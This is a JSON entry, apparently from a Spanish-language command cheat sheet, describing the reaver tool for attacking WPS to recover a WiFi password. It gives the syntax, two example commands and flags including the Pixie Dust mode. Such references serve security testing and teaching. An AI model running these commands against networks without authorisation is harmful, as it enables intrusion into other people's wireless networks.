{
  "id": "reaver",
  "title": "reaver — Ataque WPS",
  "description": "Explota la función WPS para recuperar la clave WiFi mediante PIN.",
  "syntax": "sudo reaver -i interfaz -b MAC",
  "examples": [
    {
      "cmd": "sudo reaver -i wlan0mon -b MAC",
      "desc": "Ataque WPS por defecto."
    },
    {
      "cmd": "sudo reaver -i wlan0mon -b MAC -vv -K 1",
      "desc": "Con más verbosidad."
    }
  ],
  "options": [
    {
      "flag": "-i",
      "desc": "Interfaz."
    },
    {
      "flag": "-b",
      "desc": "BSSID."
    },
    {
      "flag": "-c",
      "desc": "Canal."
    },
    {
      "flag": "-K",
      "desc": "Modo de ataque 1/Pixie Dust."
    }
  ]
}
